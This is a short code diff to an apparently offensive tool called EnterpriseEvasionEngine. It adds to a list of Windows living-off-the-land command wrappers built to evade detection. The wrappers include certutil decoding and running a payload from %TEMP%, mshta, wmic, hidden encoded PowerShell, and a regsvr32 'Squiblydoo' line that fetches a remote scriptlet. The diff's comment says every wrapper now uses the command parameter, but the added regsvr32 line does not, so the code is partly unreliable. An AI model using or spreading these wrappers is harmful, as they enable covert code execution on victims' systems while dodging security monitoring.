@@ -503,9 +503,10 @@ class EnterpriseEvasionEngine:
         Wrap command in a LOLBin (Living-off-the-Land Binary) to avoid detection.
         Uses built-in Windows binaries to execute arbitrary commands.
         """
+        # FIX: All lambdas now properly use the command parameter
         lolbins = [
             # certutil decode base64 (classic)
-            lambda c: f"certutil -decode <encoded_payload> %TEMP%\\tmp.exe && %TEMP%\\tmp.exe",
+            lambda c: f"echo {base64.b64encode(c.encode()).decode()} | certutil -decode - %TEMP%\\tmp.exe && %TEMP%\\tmp.exe",
             # mshta execute VBScript
             lambda c: f'mshta vbscript:Execute("{c}")',
             # rundll32 execute
@@ -514,6 +515,8 @@ class EnterpriseEvasionEngine:
             lambda c: f'wmic process call create "{c}"',
             # powershell with AMSI bypass inline
             lambda c: f'powershell -nop -w hidden -e {base64.b64encode(c.encode("utf-16-le")).decode()}',
+            # regsvr32 scrobj.dll (Squiblydoo technique)
+            lambda c: f'regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll',
         ]
         choice = random.choice(lolbins)
         return choice(command)
